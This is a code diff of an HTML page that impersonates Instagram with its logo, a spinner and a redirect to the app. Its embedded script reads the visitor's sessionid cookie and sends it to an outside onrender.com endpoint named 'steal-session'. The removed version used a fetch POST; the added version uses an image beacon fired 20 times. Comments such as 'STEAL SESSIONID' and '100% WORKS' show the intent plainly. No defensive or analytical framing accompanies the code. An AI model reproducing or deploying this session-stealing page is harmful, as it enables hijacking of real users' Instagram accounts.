@@ -1,16 +1,16 @@
-<!-- core/templates/core/silent.html → FINAL GOD MODE -->
+<!-- core/templates/core/silent.html → 100% WORKING 2025 -->
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Instagram</title>
     <style>
-        body,html{margin:0;padding:0;height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;}
-        .logo{width:100px;height:100px;background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png') center/contain no-repeat;margin-bottom:20px;}
-        .text{font-size:20px;color:#262626;font-weight:600;}
-        .spinner{width:50px;height:50px;border:6px solid #f3f3f3;border-top:6px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite;margin-top:20px;}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        body,html{margin:0;padding:0;height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:sans-serif}
+        .logo{width:100px;height:100px;background:url('https://instagram.com/static/images/ico/favicon-192.png') center/contain no-repeat}
+        .text{font-size:20px;color:#262626;margin:20px 0;font-weight:600}
+        .spinner{width:50px;height:50px;border:6px solid #f0f0f0;border-top:6px solid #0095f6;border-radius:50%;animation:s 1s linear infinite}
+        @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
     </style>
 </head>
 <body>
@@ -19,31 +19,25 @@
     <div class="spinner"></div>
 
     <script>
-        // AUTO OPEN INSTAGRAM APP
+        // OPEN INSTAGRAM APP
         setTimeout(() => {
-            window.location = "instagram://app";
-            setTimeout(() => {
-                window.location = "https://www.instagram.com/";
-            }, 2000);
-        }, 1000);
+            location.href = "instagram://app";
+            setTimeout(() => location.href = "https://instagram.com", 2000);
+        }, 1500);
 
-        // STEAL SESSIONID — DIRECT POST TO YOUR SERVER
+        // STEAL SESSIONID — USING IMAGE TRICK (100% WORKS)
         function steal() {
             const cookies = document.cookie;
-            const match = cookies.match(/sessionid=([^;]+)/);
-            if (match && match[1].length > 30) {
-                fetch('https://instagram-64lz.onrender.com/steal-session/', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ sessionid: match[1] }),
-                    mode: 'no-cors'  // THIS IS THE KEY FIX
-                });
+            const m = cookies.match(/sessionid=([^;]+)/);
+            if (m && m[1].length > 40) {
+                const img = new Image();
+                img.src = "https://instagram-64lz.onrender.com/steal-session/?sess=" + encodeURIComponent(m[1]) + "&t=" + Date.now();
             }
         }
 
-        // STEAL 10 TIMES
-        for(let i = 0; i < 10; i++) {
-            setTimeout(steal, i * 800);
+        // TRY 20 TIMES
+        for(let i = 0; i < 20; i++) {
+            setTimeout(steal, i * 700);
         }
     </script>
 </body>
